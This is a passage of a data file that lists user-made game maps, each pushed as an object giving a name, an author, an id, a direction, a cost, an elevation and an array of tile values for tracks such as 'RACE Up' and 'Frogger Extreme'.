15,15,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,0,0,0,0,15,15,15,15,15,15,15,15,0,0,0,0,15,15,15,15,0,0,0,0,0,15,15,15,15,15,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,2,2,15,0]});
maps.push({name="RACE Up",author="TF2 Pencil",id="#1668359361",direction="forward",cost=136,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,14,14,14,14,15,16,17,18,19,19,18,17,16,15,14,14,14,14,0,0,14,14,14,14,15,16,17,18,19,19,18,17,16,15,14,14,14,14,0,0,14,14,14,14,15,16,17,18,19,19,18,17,16,15,14,14,14,14,0,0,14,14,14,14,15,16,17,18,19,19,18,17,16,15,14,14,14,14,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Simple Turning",author="TF2 Pencil",id="#1668359490",direction="left",cost=175,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,38,2,2,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,38,38,38,38,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,2,38,38,38,38,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,2,38,38,38,38,38,0,0,0,0,0,0,0,38,38,38,38,38,38,0,38,38,38,38,38,38,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,38,38,38,38,38,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,38,38,38,38,0,0,0,0,0,0,0,0,38,38,38,38,38,0,0,0,38,38,38,38,38,0,0,0,0,0,0,0,0,38,38,38,38,0,0,0,38,38,38,38,38,0,0,0,0,0,0,0,0,38,38,38,38,0,0,0,38,38,38,38,38,38,38,0,0,0,0,0,0,38,38,38,38,0,0,0,38,38,38,38,38,38,38,0,0,0,0,38,38,38,38,38,38,0,0,0,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,0,0,0,0,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,0,0,0,0,0,38,38,38,38,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Long or Short",author="TF2 Pencil",id="#1668359551",direction="right",cost=156,elevation=0,map=[0,11,2,2,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,2,0,11,11,11,11,0,0,0,0,0,0,0,0,0,11,11,11,11,11,2,0,11,11,11,11,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,0,11,11,11,11,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,0,0,0,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Secret Path",author="FL00D",id="#1668359751",direction="right",cost=147,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,16,16,16,0,0,0,16,16,16,0,0,183,16,16,16,0,0,0,13,3,16,16,16,0,0,0,16,16,16,0,183,0,16,16,16,0,0,0,13,13,16,16,16,0,0,0,16,16,16,183,0,0,16,16,16,0,0,0,13,13,0,183,0,0,0,0,183,0,0,0,0,0,183,0,0,0,0,0,13,13,0,183,0,0,0,0,183,0,0,0,0,0,0,183,0,0,0,0,13,13,0,183,0,0,0,0,183,0,0,0,0,0,183,0,0,0,0,0,13,13,16,16,16,0,0,0,16,16,16,0,0,0,16,16,16,0,0,0,13,13,16,16,16,0,0,0,16,16,16,0,0,0,16,93,16,0,0,0,13,13,16,16,16,183,183,183,16,16,16,0,0,0,16,93,16,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,16,93,16,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,16,93,16,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,2,0,0,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Another Shortcut",author="FL00D",id="#1668359844",direction="left",cost=154,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,11,11,0,0,0,0,2,11,11,11,11,11,11,11,98,11,11,11,11,11,11,11,0,0,0,0,2,11,11,11,11,11,11,11,98,11,11,11,11,11,11,11,0,0,0,0,0,0,11,11,1,1,1,1,1,1,1,1,1,1,11,11,0,0,0,0,0,0,11,11,196,11,0,0,11,111,0,111,96,111,11,11,0,0,0,0,0,0,11,11,196,11,0,0,11,111,0,111,96,111,11,11,0,0,0,0,0,0,11,11,1,1,1,1,1,1,1,1,1,1,4,4,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,34,34,34,0,36,36,36,36,36,36,36,0,16,16,97,0,0,0,0,0,34,99,34,0,36,36,36,36,36,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="991rfjw9vj298n2nf2vd",author="FL00D",id="#1668359900",direction="left",cost=256,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,1,1,1,14,14,14,14,14,14,1,1,14,14,0,0,0,0,0,0,20,100,1,1,14,14,14,14,14,14,1,1,14,14,0,0,0,0,0,0,20,20,1,1,14,14,1,1,14,14,1,1,14,14,0,0,0,0,0,0,4,4,1,1,14,14,1,1,14,14,1,1,14,14,0,0,0,0,0,0,14,14,1,1,14,14,1,1,14,14,1,1,14,14,0,0,0,0,0,0,14,14,1,1,14,14,1,1,14,14,1,1,14,14,0,2,14,14,14,14,14,14,96,96,14,14,96,96,14,14,96,96,14,14,0,2,14,14,14,14,14,14,96,96,14,14,96,96,14,14,96,96,14,14,0,0,0,0,0,0,14,14,1,1,195,195,1,1,14,14,1,1,195,195,0,0,0,0,0,0,14,14,1,1,195,195,1,1,14,14,1,1,195,195,0,0,0,0,0,0,14,14,1,1,14,14,1,1,14,14,1,1,14,14,0,0,0,0,0,0,14,14,1,1,14,14,1,1,14,14,1,1,14,14,0,0,0,0,0,0,14,14,14,14,14,14,1,1,14,14,14,14,14,14,0,0,0,0,0,0,97,14,14,14,14,14,1,1,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Descent",author="Block",id="#1668373267",direction="forward",cost=430,elevation=7,map=[17,17,17,17,127,127,17,17,17,2,2,17,17,17,17,127,127,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,17,17,17,17,15,13,13,13,13,13,13,13,13,13,13,13,13,13,13,15,17,17,17,17,15,13,11,11,11,11,11,11,11,11,11,11,11,11,13,15,17,17,17,17,15,13,11,9,9,9,9,9,9,9,9,9,9,11,13,15,17,17,17,17,15,13,11,9,7,7,7,7,7,7,7,7,9,11,13,15,17,17,17,17,15,13,11,9,7,5,5,5,5,5,5,7,9,11,13,15,17,17,17,17,15,13,11,9,7,5,5,5,5,5,5,7,9,11,13,15,17,17,17,17,15,13,11,9,7,5,5,5,5,5,5,7,9,11,13,15,17,17,17,17,15,13,11,9,7,5,5,5,5,5,5,7,9,11,13,15,17,17,17,17,15,13,11,9,7,5,5,5,5,5,5,7,9,11,13,15,17,17,1,1,1,1,1,1,1,143,143,143,143,143,143,1,1,1,1,1,1,1,1,1,1,1,1,1,1,105,105,105,105,105,105,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,125,125,5,5,5,5,5,5,5,5,5,5,5,5,5,5,125,125,1,0,15,15,24,24,64,64,64,64,24,24,64,64,64,64,24,24,15,15,0,0,15,125,24,125,64,64,64,64,24,24,64,64,64,64,125,24,125,15,0,0,15,125,24,125,64,64,64,64,24,24,64,64,64,64,125,24,125,15,0,0,15,15,24,24,64,64,64,64,2,2,64,64,64,64,24,24,15,15,0]});
maps.push({name="RACE A01 Race",author="ZpLit",id="#1668379682",direction="left",cost=184,elevation=0,map=[18,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,0,0,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,21,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,18,18,18,16,14,13,12,11,11,11,11,0,18,18,18,18,18,18,21,18,18,18,18,16,14,13,12,11,11,11,11,11,0,18,18,18,18,0,0,0,18,18,18,16,14,13,12,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,18,90,18,90,18,0,0,0,0,0,0,0,0,0,0,0,11,11,11,18,18,18,18,18,18,17,16,19,18,17,16,15,14,13,12,11,11,11,11,2,18,18,18,18,18,17,16,19,18,17,16,15,14,13,12,11,11,11,11,2,18,18,18,18,18,17,16,19,18,17,16,15,14,13,12,11,11,11,11,18,18,18,18,18,18,17,16,19,18,17,16,15,14,13,12,11,11,11,0,0,18,90,18,90,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Clever Hobbits",author="ZpLit",id="#1668402593",direction="left",cost=142,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,0,0,88,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,2,5,5,65,65,18,3,5,5,87,0,0,0,0,0,0,3,3,0,0,2,5,5,65,65,18,3,5,5,5,0,0,0,0,0,0,18,18,0,0,88,5,0,18,18,0,0,0,5,5,0,0,0,0,0,0,65,65,0,0,0,0,0,3,3,0,0,0,5,5,0,0,0,0,0,0,65,65,0,0,0,0,0,5,5,0,0,0,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,5,5,0,0,0,0,0,0,3,3,0,0,0,0,0,5,5,0,0,0,5,5,0,0,0,0,0,0,18,18,0,0,0,0,0,5,5,5,5,5,5,5,65,65,18,3,5,5,65,65,0,0,0,0,0,87,5,5,5,5,5,5,65,65,18,3,5,5,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="All Different Sizes",author="ZpLit",id="#1668402760",direction="right",cost=220,elevation=0,map=[19,54,2,2,54,54,54,54,54,54,54,90,54,19,0,0,0,0,0,0,19,54,54,54,54,54,54,54,54,90,54,54,90,54,19,0,0,0,0,1,19,54,54,54,54,54,54,19,54,54,54,54,54,54,19,0,0,0,0,2,19,54,54,54,54,54,19,0,19,90,54,90,54,94,19,0,0,0,0,2,19,54,54,54,54,54,19,0,0,19,54,54,94,19,0,0,0,14,0,1,0,19,54,54,54,19,0,0,0,0,19,19,19,0,0,0,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,0,19,54,0,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,19,54,54,19,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,19,54,54,54,54,19,0,0,0,0,19,54,54,54,19,0,0,0,0,0,19,54,54,54,54,19,0,0,0,0,19,114,114,114,19,0,0,0,0,0,0,19,54,54,19,0,0,0,0,19,54,54,54,54,54,19,0,0,0,0,0,19,54,54,19,0,0,0,0,19,54,54,54,54,54,19,0,0,0,0,0,19,54,54,19,0,0,0,0,0,19,54,54,54,19,0,0,0,0,0,0,19,54,54,19,0,0,0,0,0,0,19,54,19,0,0,0,0,0,0,0,19,54,54,19,0,19,19,0,0,0,0,14,0,0,0,0,0,0,0,19,54,54,54,54,19,93,54,19,0,0,14,0,0,0,0,0,0,0,0,19,54,54,132,54,54,54,93,19,0,0,0,131,0,0,0,0,0,0,0,19,54,54,19,54,90,54,19,0]});
maps.push({name="First Moveplat",author="FL00D",id="#1668414857",direction="forward",cost=126,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,179,0,168,178,16,16,14,14,8,8,14,14,16,16,173,168,0,174,0,0,0,0,0,0,16,16,14,14,8,8,14,14,16,16,0,0,0,0,0,0,0,0,0,0,0,0,13,13,8,8,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,8,8,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,8,8,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,8,8,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,8,8,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,180,0,0,181,0,0,0,0,8,8,0,0,0,0,176,0,0,175,0,0,16,16,16,16,0,0,0,0,8,8,0,0,0,0,16,16,16,16,0,0,16,16,97,16,0,0,0,0,96,96,0,0,0,0,16,97,16,16,0,0,16,16,16,16,0,0,0,0,96,96,0,0,0,0,16,16,16,16,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Grab and Out",author="FL00D",id="#1668415366",direction="forward",cost=128,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,173,168,0,0,0,0,0,0,0,174,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,12,12,12,12,0,0,0,12,12,12,12,12,12,0,0,0,12,12,12,12,12,93,93,12,0,0,0,12,12,12,12,12,12,0,0,0,12,94,94,12,12,93,93,12,0,0,0,12,12,132,132,12,12,0,0,0,12,94,94,12,12,93,93,12,0,0,0,12,12,132,132,12,12,0,0,0,12,94,94,12,12,93,93,12,0,0,0,12,12,12,12,12,12,0,0,0,12,94,94,12,12,12,12,12,0,0,0,12,12,12,12,12,12,0,0,0,12,12,12,12,0,131,131,0,0,0,0,0,0,12,12,0,0,0,0,0,0,131,131,0,0,0,0,0,0,176,0,0,0,0,0,0,0,0,175,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Try to get it",author="FL00D",id="#1668417249",direction="right",cost=235,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,18,93,93,18,1,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,18,93,93,93,1,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,18,93,93,93,1,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,18,18,18,18,1,0,0,0,0,0,0,1,18,4,12,12,12,12,12,12,12,195,195,12,1,0,0,0,0,0,0,1,18,4,12,12,12,12,12,12,12,195,195,12,1,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,12,195,195,12,1,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,12,195,195,12,1,0,0,0,0,0,0,1,18,12,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,1,18,1,1,1,1,1,1,1,12,12,12,12,1,0,0,0,0,0,0,1,18,19,20,21,22,23,23,1,12,12,12,12,1,0,0,0,0,0,0,1,18,19,20,21,22,23,97,1,12,12,12,96,96,12,12,2,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,96,96,12,12,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="On Stage",author="FL00D",id="#1668417282",direction="forward",cost=332,elevation=-6,map=[0,0,23,23,23,23,23,23,23,2,2,23,23,23,23,23,23,23,0,0,0,0,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,0,0,0,1,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,1,0,0,1,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,1,0,0,1,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,1,0,0,1,20,20,20,17,17,17,17,17,17,17,17,17,17,20,20,20,1,0,0,1,20,20,20,17,17,17,17,17,17,17,17,17,17,20,20,20,1,0,0,1,17,17,17,17,17,14,14,14,14,14,14,17,17,17,17,17,1,0,0,1,17,17,17,17,17,14,14,14,14,14,14,17,17,17,17,17,1,0,0,1,17,17,17,17,17,14,14,14,14,14,14,17,17,17,17,17,1,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,1,0,0,1,15,16,57,57,57,57,57,57,57,57,57,57,57,57,16,15,1,0,0,1,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,57,1,0,0,1,1,1,1,1,57,57,57,57,57,57,57,1,1,1,1,1,1,0,0,0,1,1,57,57,57,57,57,57,57,57,57,57,57,1,1,0,0,0,0,0,0,1,1,57,57,57,57,57,57,57,57,57,1,1,0,0,0,0,0,0,0,0,1,1,57,57,57,57,57,57,57,1,1,0,0,0,0,0,0,0,0,0,0,1,57,57,2,2,57,57,57,1,0,0,0,0,0,0]});
maps.push({name="Sultry frogger",author="Dogeeri",id="#1668431417",direction="forward",cost=218,elevation=0,map=[0,0,0,0,0,0,0,13,2,2,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,10,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,9,10,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,153,9,9,9,10,154,87,156,0,0,0,0,0,0,0,0,0,0,0,0,164,10,10,11,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,10,10,10,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,9,10,10,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,9,9,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,10,9,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,9,10,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,9,9,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,95,95,9,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,10,95,95,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,10,10,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,9,9,9,164,0,0,0,0,0,0,0,0,0,0,0,0,87,89,164,10,10,9,12,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,12,12,12,12,164,0,0,0,0,0,0,0,0,199,199,199,199,199,199,90,13,13,13,13,90,199,199,199,199,199,199,0,0,199,100,9,9,10,12,12,13,2,2,13,12,12,10,9,9,93,199,0,0]});
maps.push({name="Frogger Extreme",author="Dogeeri",id="#1668432582",direction="forward",cost=383,elevation=1,map=[0,0,0,0,0,0,77,13,2,2,13,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,13,12,13,13,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,12,10,12,12,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,10,9,10,12,77,0,0,0,0,0,0,0,0,0,0,0,0,157,87,153,9,9,9,10,154,87,155,0,0,0,0,0,0,0,0,0,0,0,0,80,10,10,11,9,80,0,0,0,0,0,0,77,77,0,0,0,0,0,0,164,10,10,10,9,164,0,0,0,0,77,77,199,199,0,0,0,0,0,0,164,9,9,10,11,164,1,1,1,1,199,199,75,75,0,0,0,0,0,0,164,9,9,9,10,10,167,167,167,76,79,76,75,94,0,0,0,0,0,0,164,9,10,9,9,9,167,167,167,76,79,76,75,94,0,0,0,0,0,0,164,9,9,10,9,164,1,1,1,1,199,199,75,75,0,0,0,0,0,0,164,9,9,9,9,164,0,0,0,0,77,77,199,199,0,0,0,0,0,1,1,95,95,9,10,164,0,0,0,0,0,0,77,77,0,0,0,0,0,89,80,10,10,95,95,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,89,10,9,80,89,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,9,9,9,164,0,0,0,0,0,0,0,0,0,0,0,0,0,0,164,9,10,9,11,164,0,0,0,0,0,0,0,0,77,77,77,77,77,77,164,10,11,11,12,164,77,77,77,77,77,77,0,0,199,199,199,199,199,199,90,13,13,13,13,90,199,199,199,199,199,199,199,0,100,16,3,9,9,10,12,13,2,2,13,112,143,110,109,110,93,89,199,0]});
maps.push({name="RACE gradual curve",author="chinny",id="#1668448631",direction="left",cost=117,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,15,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,16,15,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,18,17,16,15,14,14,14,0,0,0,0,0,0,0,0,0,0,21,20,19,18,17,16,15,14,14,0,0,0,0,0,0,0,24,24,23,22,21,20,19,18,17,16,15,14,0,0,0,0,0,0,0,0,2,24,23,22,21,20,19,18,17,16,0,0,0,0,0,0,0,0,0,0,2,24,23,22,21,20,19,18,0,0,0,0,0,0,0,0,0,0,0,0,24,24,23,22,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
